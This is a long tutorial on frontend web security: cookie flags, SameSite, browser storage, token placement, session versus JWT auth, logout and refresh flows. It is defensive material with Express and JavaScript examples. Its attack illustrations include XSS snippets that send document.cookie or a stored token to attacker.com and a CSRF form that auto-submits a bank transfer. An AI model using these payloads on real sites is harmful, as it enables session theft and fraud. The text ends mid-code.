# 🔐 Frontend Web Security – Phase 2: Storage, State, and Identity

> **Complete guide for senior frontend engineers** covering authentication, storage mechanisms, and session management with real-world examples and security best practices.

---

## 📚 Table of Contents

1. [Cookies – Fundamentals](#1-cookies--fundamentals)
2. [Secure and HttpOnly Cookies](#2-secure-and-httponly-cookies)
3. [SameSite Cookie Policies](#3-samesite-cookie-policies)
4. [LocalStorage vs SessionStorage](#4-localstorage-vs-sessionstorage)
5. [IndexedDB Security Basics](#5-indexeddb-security-basics)
6. [Where NOT to Store Authentication Tokens](#6-where-not-to-store-authentication-tokens)
7. [Authentication Flows (Frontend Perspective)](#7-authentication-flows-frontend-perspective)
8. [Sessions vs JWT – Practical Comparison](#8-sessions-vs-jwt--practical-comparison)
9. [Logout and Session Invalidation](#9-logout-and-session-invalidation)
10. [Token Expiration and Refresh Flows](#10-token-expiration-and-refresh-flows)

---

## 1. Cookies – Fundamentals

### What are Cookies?

Cookies are small pieces of data (max 4KB) stored by the browser and sent with every HTTP request to the same domain.

### Cookie Structure

```javascript
// Cookie format
name=value; Domain=example.com; Path=/; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Secure; HttpOnly; SameSite=Strict
```

### Setting Cookies

**Server-side (Recommended):**
```javascript
// Express.js example
res.cookie('sessionId', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000 // 1 hour
});
```

**Client-side (Less Secure):**
```javascript
// Not recommended for sensitive data
document.cookie = "username=john; max-age=3600; path=/";
```

### Reading Cookies (Client-side)

```javascript
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

const sessionId = getCookie('sessionId');
```

### Key Properties

| Property | Purpose | Example |
|----------|---------|---------|
| **Domain** | Which domain can access cookie | `Domain=example.com` |
| **Path** | Which URL path can access | `Path=/api` |
| **Expires/Max-Age** | When cookie expires | `Max-Age=3600` |
| **Secure** | HTTPS only | `Secure` |
| **HttpOnly** | No JavaScript access | `HttpOnly` |
| **SameSite** | Cross-site request control | `SameSite=Strict` |

---

## 2. Secure and HttpOnly Cookies

### HttpOnly Flag

**Purpose:** Prevents JavaScript from accessing cookies, protecting against XSS attacks.

```javascript
// ❌ BAD: Cookie accessible via JavaScript
res.cookie('token', 'secret123', {
  secure: true
});

console.log(document.cookie); // Can read: "token=secret123"

// ✅ GOOD: Cookie hidden from JavaScript
res.cookie('token', 'secret123', {
  httpOnly: true,  // JavaScript cannot read this
  secure: true
});

console.log(document.cookie); // Empty or other non-HttpOnly cookies
```

### Secure Flag

**Purpose:** Cookie only sent over HTTPS connections.

```javascript
// ❌ BAD: Cookie sent over HTTP (vulnerable to interception)
res.cookie('sessionId', 'abc123');

// ✅ GOOD: Cookie only sent over HTTPS
res.cookie('sessionId', 'abc123', {
  secure: true,
  httpOnly: true
});
```

### Real-World Example

```javascript
// Express.js authentication endpoint
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Verify credentials
  const user = await authenticateUser(username, password);
  
  if (user) {
    const sessionToken = generateSecureToken();
    
    // Store in secure, httpOnly cookie
    res.cookie('auth_token', sessionToken, {
      httpOnly: true,    // XSS protection
      secure: true,      // HTTPS only
      sameSite: 'strict', // CSRF protection
      maxAge: 7200000    // 2 hours
    });
    
    res.json({ success: true, user: { id: user.id, name: user.name } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### Attack Scenario (Without HttpOnly)

```javascript
// Malicious script injected via XSS
<script>
  // Attacker steals cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// With HttpOnly: document.cookie returns empty → Attack fails ✅
```

---

## 3. SameSite Cookie Policies

### What is SameSite?

Controls whether cookies are sent with cross-site requests, preventing CSRF attacks.

### Three Modes


### 1. SameSite=Strict

**Most secure:** Cookie NEVER sent in cross-site requests.

```javascript
res.cookie('session', 'xyz', {
  sameSite: 'strict',
  httpOnly: true,
  secure: true
});
```

**Scenario:**
```
User on facebook.com → Clicks link to yoursite.com
❌ Cookie NOT sent with initial request
✅ Cookie sent after page loads (same-site navigation)
```

**Use case:** Banking apps, admin panels

### 2. SameSite=Lax (Default)

**Balanced:** Cookie sent on top-level GET navigation.

```javascript
res.cookie('tracking', 'abc', {
  sameSite: 'lax'  // Default in modern browsers
});
```

**Scenario:**
```
✅ Sent: <a href="yoursite.com">Link</a>
✅ Sent: window.location = "yoursite.com"
❌ NOT Sent: 
❌ NOT Sent: fetch('yoursite.com/api')
❌ NOT Sent: <form method="POST">
```

**Use case:** General websites, e-commerce

### 3. SameSite=None

**Least secure:** Cookie sent in ALL cross-site requests (requires HTTPS).

```javascript
res.cookie('embed', '123', {
  sameSite: 'none',
  secure: true  // REQUIRED with None
});
```

**Use case:** Embedded widgets, OAuth flows, third-party integrations

### Practical Example: CSRF Protection

```javascript
// ❌ VULNERABLE: No SameSite protection
app.post('/api/transfer-money', (req, res) => {
  const sessionCookie = req.cookies.session; // Sent from attacker.com!
  // Process transfer...
});

// Attacker's site
<form action="https://bank.com/api/transfer-money" method="POST">
  <input name="amount" value="10000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>

// ✅ PROTECTED: SameSite=Strict
res.cookie('session', token, {
  sameSite: 'strict'
});
// Cookie NOT sent from attacker.com → Request fails ✅
```

---

## 4. LocalStorage vs SessionStorage

### Comparison Table

| Feature | LocalStorage | SessionStorage | Cookies |
|---------|--------------|----------------|---------|
| **Capacity** | ~5-10MB | ~5-10MB | ~4KB |
| **Lifetime** | Until deleted | Until tab closes | Until expires |
| **Scope** | All tabs/windows | Single tab | All tabs/windows |
| **Auto-sent to server** | ❌ No | ❌ No | ✅ Yes |
| **XSS Vulnerable** | ✅ Yes | ✅ Yes | Depends (HttpOnly) |
| **Access** | JavaScript only | JavaScript only | JS + Server |

### LocalStorage

**Persists forever** until manually deleted.

```javascript
// Set data
localStorage.setItem('theme', 'dark');
localStorage.setItem('user', JSON.stringify({ name: 'John', id: 123 }));

// Get data
const theme = localStorage.getItem('theme'); // 'dark'
const user = JSON.parse(localStorage.getItem('user'));

// Remove
localStorage.removeItem('theme');
localStorage.clear(); // Remove all

// Check if key exists
if (localStorage.getItem('theme') !== null) {
  // Key exists
}
```

**Use cases:**
- User preferences (theme, language)
- Non-sensitive cached data
- Shopping cart (until purchase)
- Draft content

### SessionStorage

**Data cleared when tab/window closes.**

```javascript
// Set data
sessionStorage.setItem('formDraft', JSON.stringify(formData));

// Get data
const draft = JSON.parse(sessionStorage.getItem('formDraft'));

// Same API as localStorage
sessionStorage.removeItem('formDraft');
sessionStorage.clear();
```

**Use cases:**
- Temporary form data
- Single-page app state
- Wizard/multi-step flows
- Sensitive data that shouldn't persist

### Practical Example: Theme Switcher

```javascript
// Theme manager with localStorage
class ThemeManager {
  constructor() {
    this.STORAGE_KEY = 'user_theme';
    this.loadTheme();
  }
  
  loadTheme() {
    const saved = localStorage.getItem(this.STORAGE_KEY) || 'light';
    document.body.className = `theme-${saved}`;
    return saved;
  }
  
  setTheme(theme) {
    localStorage.setItem(this.STORAGE_KEY, theme);
    document.body.className = `theme-${theme}`;
  }
  
  toggle() {
    const current = this.loadTheme();
    const newTheme = current === 'light' ? 'dark' : 'light';
    this.setTheme(newTheme);
  }
}

// Usage
const themeManager = new ThemeManager();
document.getElementById('toggle').onclick = () => themeManager.toggle();
```

### Security Consideration

```javascript
// ❌ BAD: Storing sensitive data
localStorage.setItem('authToken', 'secret_jwt_token');
localStorage.setItem('password', 'user123'); // NEVER!

// ✅ GOOD: Non-sensitive data only
localStorage.setItem('recentSearches', JSON.stringify(['react', 'vue']));
```

---

## 5. IndexedDB Security Basics

### What is IndexedDB?

Large-scale client-side database (up to hundreds of MB) for structured data.

### Basic Usage

```javascript
// Open database
const request = indexedDB.open('MyDatabase', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  
  // Create object store
  const store = db.createObjectStore('users', { keyPath: 'id' });
  store.createIndex('email', 'email', { unique: true });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // Add data
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');
  
  store.add({ id: 1, name: 'John', email: 'john@example.com' });
  
  // Read data
  const getRequest = store.get(1);
  getRequest.onsuccess = () => {
    console.log(getRequest.result); // { id: 1, name: 'John', ... }
  };
};
```

### Security Concerns

#### 1. **Same-Origin Policy**

IndexedDB data isolated per origin (protocol + domain + port).

```javascript
// https://example.com → Database A
// https://api.example.com → Database B (different origin)
// http://example.com → Database C (different protocol)
```

#### 2. **XSS Vulnerability**

```javascript
// ❌ Attacker injects script
<script>
  // Can access entire IndexedDB
  const request = indexedDB.open('MyDatabase', 1);
  request.onsuccess = (e) => {
    const db = e.target.result;
    // Steal or modify all data
  };
</script>
```

#### 3. **No Encryption by Default**

```javascript
// ❌ BAD: Sensitive data in plaintext
store.add({ id: 1, creditCard: '4111111111111111' });

// ✅ GOOD: Encrypt before storing
async function encryptData(data, key) {
  const encoder = new TextEncoder();
  const dataBuffer = encoder.encode(JSON.stringify(data));
  
  const encryptedBuffer = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: window.crypto.getRandomValues(new Uint8Array(12)) },
    key,
    dataBuffer
  );
  
  return encryptedBuffer;
}

const encrypted = await encryptData({ creditCard: '4111...' }, cryptoKey);
store.add({ id: 1, data: encrypted });
```

### Practical Example: Offline-First App

```javascript
class OfflineStorage {
  constructor(dbName) {
    this.dbName = dbName;
    this.db = null;
  }
  
  async init() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, 1);
      
      request.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains('posts')) {
          db.createObjectStore('posts', { keyPath: 'id' });
        }
      };
      
      request.onsuccess = (e) => {
        this.db = e.target.result;
        resolve();
      };
      
      request.onerror = () => reject(request.error);
    });
  }
  
  async savePost(post) {
    const transaction = this.db.transaction(['posts'], 'readwrite');
    const store = transaction.objectStore('posts');
    return store.put(post);
  }
  
  async getAllPosts() {
    return new Promise((resolve) => {
      const transaction = this.db.transaction(['posts'], 'readonly');
      const store = transaction.objectStore('posts');
      const request = store.getAll();
      request.onsuccess = () => resolve(request.result);
    });
  }
}

// Usage
const storage = new OfflineStorage('BlogApp');
await storage.init();
await storage.savePost({ id: 1, title: 'Hello', content: '...' });
```

### Best Practices

1. ✅ **Never store sensitive data unencrypted**
2. ✅ **Implement data expiration**
3. ✅ **Validate data before storing**
4. ✅ **Use for large, non-sensitive datasets**
5. ❌ **Don't store passwords, tokens, or PII**

---

## 6. Where NOT to Store Authentication Tokens

### ❌ LocalStorage (Most Common Mistake)

```javascript
// ❌ VULNERABLE TO XSS
localStorage.setItem('authToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// Attacker's injected script can steal it
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('authToken')
  });
</script>
```

### ❌ SessionStorage

```javascript
// ❌ Same XSS vulnerability as localStorage
sessionStorage.setItem('jwt', token);
```

### ❌ Plain JavaScript Variables

```javascript
// ❌ XSS can access global scope
window.authToken = 'secret';
globalThis.token = 'secret';
```

### ❌ URL Parameters

```javascript
// ❌ Token visible in browser history, logs, referer headers
window.location = '/dashboard?token=secret123';
```

### ❌ Visible Cookies (without HttpOnly)

```javascript
// ❌ Accessible via document.cookie
document.cookie = 'token=secret';
```

### ✅ WHERE TO STORE TOKENS

#### 1. **HttpOnly Cookies (Best for Web)**

```javascript
// Server sets cookie
res.cookie('auth_token', jwt, {
  httpOnly: true,   // Not accessible via JavaScript
  secure: true,     // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 3600000
});

// Frontend doesn't handle token - browser auto-sends it
fetch('/api/user/profile', {
  credentials: 'include'  // Include cookies
});
```

#### 2. **Memory Only (for SPAs with refresh tokens)**

```javascript
// Store in closure (not window scope)
class AuthService {
  #accessToken = null;  // Private field
  
  setToken(token) {
    this.#accessToken = token;
  }
  
  getToken() {
    return this.#accessToken;
  }
  
  async request(url, options = {}) {
    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.#accessToken}`
      }
    });
  }
}

const auth = new AuthService();
// Token lives only in memory, cleared on page refresh
```

### Comparison Chart

```mermaid
graph TD
    A[Token Storage Options] --> B[❌ LocalStorage]
    A --> C[❌ SessionStorage]
    A --> D[✅ HttpOnly Cookie]
    A --> E[✅ Memory Only]
    
    B --> B1[XSS Vulnerable]
    C --> C1[XSS Vulnerable]
    D --> D1[XSS Protected<br/>CSRF Protected with SameSite]
    E --> E1[XSS Protected<br/>Lost on refresh]
```



### Real Attack Scenario

```javascript
// Vulnerable app stores JWT in localStorage
localStorage.setItem('token', jwt);

// Attacker finds XSS vulnerability and injects:


// Attacker now has your token → Can impersonate you
```

---

## 7. Authentication Flows (Frontend Perspective)

### Flow 1: Traditional Session-Based Auth


**Code Example:**

```javascript
// Frontend: Login
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',  // Important: include cookies
    body: JSON.stringify({ username, password })
  });
  
  if (response.ok) {
    // Session cookie set automatically by browser
    window.location.href = '/dashboard';
  }
}

// Frontend: Authenticated request
async function getUserProfile() {
  const response = await fetch('/api/profile', {
    credentials: 'include'  // Send session cookie
  });
  return response.json();
}
```

### Flow 2: JWT Token-Based Auth


**Code Example:**

```javascript
class AuthManager {
  constructor() {
    this.accessToken = null;
    this.refreshToken = null;
  }
  
  async login(username, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    
    const { accessToken, refreshToken } = await response.json();
    
    // Store in memory (not localStorage!)
    this.accessToken = accessToken;
    
    // Refresh token in HttpOnly cookie (set by server)
    // OR in memory if needed for mobile apps
    this.refreshToken = refreshToken;
  }
  
  async makeRequest(url, options = {}) {
    let response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });
    
    // If token expired, refresh and retry
    if (response.status === 401) {
      await this.refreshAccessToken();
      response = await fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${this.accessToken}`
        }
      });
    }
    
    return response;
  }
  
  async refreshAccessToken() {
    const response = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken: this.refreshToken })
    });
    
    const { accessToken } = await response.json();
    this.accessToken = accessToken;
  }
}
```

### Flow 3: OAuth 2.0 (Social Login)


**Code Example:**

```javascript
// Initiate OAuth flow
function loginWithGoogle() {
  const params = new URLSearchParams({
    client_id: 'YOUR_CLIENT_ID',
    redirect_uri: 'https://yourapp.com/auth/callback',
    response_type: 'code',
    scope: 'openid email profile'
  });
  
  window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?${params}`;
}

// Handle callback
async function handleOAuthCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  
  if (code) {
    // Send code to your backend
    const response = await fetch('/api/auth/google/callback', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code })
    });
    
    if (response.ok) {
      // Backend sets session cookie or returns JWT
      window.location.href = '/dashboard';
    }
  }
}
```

---

## 8. Sessions vs JWT – Practical Comparison

### Architecture Comparison


### Detailed Comparison

| Aspect | Session-Based | JWT-Based |
|--------|---------------|-----------|
| **Storage** | Server (Redis, DB) | Client (memory/cookie) |
| **State** | Stateful | Stateless |
| **Scalability** | Harder (shared session store) | Easier (no server state) |
| **Revocation** | Easy (delete from DB) | Hard (need blacklist) |
| **Size** | Small (session ID only) | Large (~200-500 bytes) |
| **Security** | Can revoke instantly | Valid until expiration |
| **Complexity** | Simple | More complex |

### Session-Based Implementation

```javascript
// Backend: Express + Redis
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const redisClient = redis.createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000 // 1 hour
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  
  if (user) {
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Protected route
app.get('/api/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const user = getUserById(req.session.userId);
  res.json(user);
});

// Frontend
async function login(username, password) {
  await fetch('/login', {
    method: 'POST',
    credentials: 'include',  // Important!
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
}
```

### JWT-Based Implementation

```javascript
// Backend: JWT creation
const jwt = require('jsonwebtoken');

app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  
  if (user) {
    const accessToken = jwt.sign(
      { userId: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    const refreshToken = jwt.sign(
      { userId: user.id },
      process.env.REFRESH_SECRET,
      { expiresIn: '7d' }
    );
    
    // Send refresh token as HttpOnly cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
    });
    
    res.json({ accessToken });
  }
});

// Middleware to verify JWT
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) return res.status(401).json({ error: 'No token' });
  
  jwt.verify(token, process.env.JWT_SECRET, (err, payload) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = payload;
    next();
  });
}

app.get('/api/profile', authenticateToken, (req, res) => {
  const user = getUserById(req.user.userId);
  res.json(user);
});

// Frontend
class JWTAuth {
  constructor() {
    this.token = null;
  }
  
  async login(username, password) {
    const res = await fetch('/login', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    
    const { accessToken } = await res.json();
    this.token = accessToken;
  }
  
  async getProfile() {
    return fetch('/api/profile', {
      headers: {
        'Authorization': `Bearer ${this.token}`
      }
    });
  }
}
```

### When to Use Each

**Use Sessions when:**
- Building traditional web apps (server-rendered)
- Need instant revocation (e.g., admin panels)
- Single-server or simple architecture
- Security is paramount

**Use JWT when:**
- Building APIs for mobile apps
- Microservices architecture
- Need horizontal scaling
- Third-party API integration

### Hybrid Approach (Best of Both Worlds)

```javascript
// Short-lived JWT + Refresh token in HttpOnly cookie

// Backend
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  
  // Access token (5-15 minutes)
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  // Refresh token (7 days) stored in HttpOnly cookie
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // Save refresh token in DB for revocation capability
  await saveRefreshToken(user.id, refreshToken);
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });
  
  res.json({ accessToken });
});

// Refresh endpoint
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  
  if (!refreshToken) return res.status(401).send('No refresh token');
  
  // Check if token exists in DB (not revoked)
  const isValid = await isRefreshTokenValid(refreshToken);
  if (!isValid) return res.status(403).send('Token revoked');
  
  jwt.verify(refreshToken, process.env.REFRESH_SECRET, (err, payload) => {
    if (err) return res.status(403).send('Invalid token');
    
    const newAccessToken = jwt.sign(
      { userId: payload.userId },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ accessToken: newAccessToken });
  });
});
```

---

## 9. Logout and Session Invalidation

### Session-Based Logout

```javascript
// Backend: Simple session destruction
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid'); // Clear session cookie
    res.json({ success: true });
  });
});

// Frontend
async function logout() {
  await fetch('/api/logout', {
    method: 'POST',
    credentials: 'include'
  });
  
  window.location.href = '/login';
}
```

### JWT Logout (More Complex)

**Problem:** JWTs are stateless and valid until expiration.

**Solutions:**

#### 1. Token Blacklist

```javascript
// Backend: Maintain blacklist in Redis
const redis = require('redis');
const redisClient = redis.createClient();

app.post('/logout', authenticateToken, async (req, res) => {
  const token = req.headers.authorization.split(' ')[1];
  
  // Add to blacklist with expiration matching token TTL
  const decoded = jwt.decode(token);
  const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);
  
  await redisClient.setex(`blacklist:${token}`, expiresIn, 'true');
  
  res.json({ success: true });
});

// Middleware: Check blacklist
async function checkBlacklist(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (token) {
    const isBlacklisted = await redisClient.get(`blacklist:${token}`);
    if (isBlacklisted) {
      return res.status(401).json({ error: 'Token revoked' });
    }
  }
  
  next();
}

app.use(checkBlacklist);
```

#### 2. Refresh Token Revocation

```javascript
// Backend: Delete refresh token from DB
app.post('/logout', authenticateToken, async (req, res) => {
  const { refreshToken } = req.cookies;
  
  // Delete from database
  await deleteRefreshToken(refreshToken);
  
  res.clearCookie('refreshToken');
  res.json({ success: true });
});

// Frontend
class Auth {
  async logout() {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Authorization': `Bearer ${this.accessToken}`
      }
    });
    
    // Clear token from memory
    this.accessToken = null;
    
    window.location.href = '/login';
  }
}
```

#### 3. Short-Lived Tokens (Best Practice)

```javascript
// Issue very short access tokens (5-15 minutes)
const accessToken = jwt.sign(payload, secret, { expiresIn: '5m' });

// On logout, clear refresh token
// Access token expires quickly anyway
```

### Logout Everywhere (All Devices)

```javascript
// Backend: Store token version in DB
// User schema
{
  id: 123,
  username: 'john',
  tokenVersion: 5  // Increment on "logout everywhere"
}

// Include version in JWT
const token = jwt.sign(
  { userId: user.id, tokenVersion: user.tokenVersion },
  secret,
  { expiresIn: '15m' }
);

// Verify token version
function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  jwt.verify(token, secret, async (err, payload) => {
    if (err) return res.status(403).send('Invalid token');
    
    const user = await getUserById(payload.userId);
    
    // Check if token version matches
    if (payload.tokenVersion !== user.tokenVersion) {
      return res.status(401).json({ error: 'Token invalidated' });
    }
    
    req.user = payload;
    next();
  });
}

// Logout everywhere endpoint
app.post('/logout-all', authenticateToken, async (req, res) => {
  await incrementTokenVersion(req.user.userId);
  res.json({ success: true });
});
```

### Frontend Logout Flow

```javascript
class AuthService {
  async logout() {
    try {
      // Call backend logout
      await fetch('/api/logout', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Authorization': `Bearer ${this.accessToken}`
        }
      });
    } catch (error) {
      console.error('Logout error:', error);
    } finally {
      // Always clean up locally
      this.clearTokens();
      this.clearUserData();
      window.location.href = '/login';
    }
  }
  
  clearTokens() {
    this.accessToken = null;
    this.refreshToken = null;
    // Clear any other stored auth data
  }
  
  clearUserData() {
    // Clear user-specific data
    sessionStorage.clear();
    // Don't clear localStorage completely (might have theme, etc.)
    localStorage.removeItem('userData');
  }
}
```

### Security Best Practices

```javascript
// ✅ GOOD: Comprehensive logout
async function secureLogout() {
  // 1. Invalidate on server
  await fetch('/api/logout', { method: 'POST', credentials: 'include' });
  
  // 2. Clear tokens
  authService.clearTokens();
  
  // 3. Clear sensitive data
  sessionStorage.clear();
  
  // 4. Redirect
  window.location.href = '/login';
}

// ❌ BAD: Only clearing tokens locally
function insecureLogout() {
  authService.clearTokens();
  // Session still valid on server! Token can be reused if intercepted
}
```

---

## 10. Token Expiration and Refresh Flows

### Access Token + Refresh Token Pattern


### Complete Implementation

#### Backend: Token Generation

```javascript
// Token utilities
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const ACCESS_TOKEN_SECRET = process.env.ACCESS_SECRET;
const REFRESH_TOKEN_SECRET = process.env.REFRESH_SECRET;

function generateAccessToken(user) {
  return jwt.sign(
    { 
      userId: user.id, 
      email: user.email,
      role: user.role 
    },
    ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' }  // Short-lived
  );
}

function generateRefreshToken(user) {
  return jwt.sign(
    { 
      userId: user.id,
      tokenId: crypto.randomBytes(16).toString('hex')  // Unique ID for revocation
    },
    REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' }  // Long-lived
  );
}

// Login endpoint
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await authenticateUser(email, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);
  
  // Store refresh token in database
  await saveRefreshToken({
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });
  
  // Send refresh token as HttpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });
  
  res.json({ 
    accessToken,
    user: { id: user.id, email: user.email, name: user.name }
  });
});

// Refresh endpoint
app.post('/api/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // Verify token signature
    const payload = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);
    
    // Check if token exists in database (not revoked)
    const storedToken = await getRefreshToken(refreshToken);
    if (!storedToken || storedToken.revoked) {
      return res.status(403).json({ error: 'Token revoked' });
    }
    
    // Check if token expired
    if (new Date() > storedToken.expiresAt) {
      await deleteRefreshToken(refreshToken);
      return res.status(403).json({ error: 'Token expired' });
    }
    
    // Get user
    const user = await getUserById(payload.userId);
    
    // Generate new access token
    const newAccessToken = generateAccessToken(user);
    
    res.json({ accessToken: newAccessToken });
    
  } catch (error) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

#### Frontend: Automatic Token Refresh

```javascript
class TokenManager {
  constructor() {
    this.accessToken = null;
    this.refreshPromise = null;  // Prevent concurrent refresh calls
  }
  
  setAccessToken(token) {
    this.accessToken = token;
  }
  
  getAccessToken() {
    return this.accessToken;
  }
  
  async refreshAccessToken() {
    // If refresh already in progress, wait for it
    if (this.refreshPromise) {
      return this.refreshPromise;
    }
    
    this.refreshPromise = fetch('/api/refresh', {
      method: 'POST',
      credentials: 'include'  // Send refresh token cookie
    })
      .then(async (response) => {
        if (!response.ok) {
          throw new Error('Refresh failed');
        }
        
        const { accessToken } = await response.json();
        this.setAccessToken(accessToken);
        return accessToken;
      })
      .finally(() => {
        this.refreshPromise = null;
      });
    
    return this.refreshPromise;
  }
  
  // Wrapper for fetch with auto-refresh
  async authenticatedFetch(url, options = {}) {
    // First attempt with current token
    let response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });
    
    // If 401, try refreshing token
    if (response.status === 401) {
      try {
        await this.refreshAccessToken();
        
        // Retry request with new token
        response = await fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${this.accessToken}`
          }
        });
      } catch (error) {
        // Refresh failed - redirect to login
        window.location.href = '/login';
        throw error;
      }
    }
    
    return response;
  }
}

// Usage
const tokenManager = new TokenManager();

// Login
async function login(email, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });
  
  if (response.ok) {
    const { accessToken, user } = await response.json();
    tokenManager.setAccessToken(accessToken);
    return user;
  }
  
  throw new Error('Login failed');
}

// Make authenticated requests
async function getUserProfile() {
  const response = await tokenManager.authenticatedFetch('/api/profile');
  return response.json();
}
```

#### Advanced: Axios Interceptor Pattern

```javascript
import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true  // Send cookies
});

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });
  
  failedQueue = [];
};

// Request interceptor: Add token to requests
api.interceptors.request.use(
  (config) => {
    const token = tokenManager.getAccessToken();
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response interceptor: Handle 401 and refresh token
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    // If error is 401 and we haven't retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      
      if (isRefreshing) {
        // If already refreshing, queue this request
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(token => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            return api(originalRequest);
          })
          .catch(err => Promise.reject(err));
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        const { data } = await axios.post('/api/refresh', {}, {
          withCredentials: true
        });
        
        const { accessToken } = data;
        tokenManager.setAccessToken(accessToken);
        
        // Update failed requests with new token
        processQueue(null, accessToken);
        
        // Retry original request
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return api(originalRequest);
        
      } catch (refreshError) {
        processQueue(refreshError, null);
        
        // Refresh failed - redirect to login
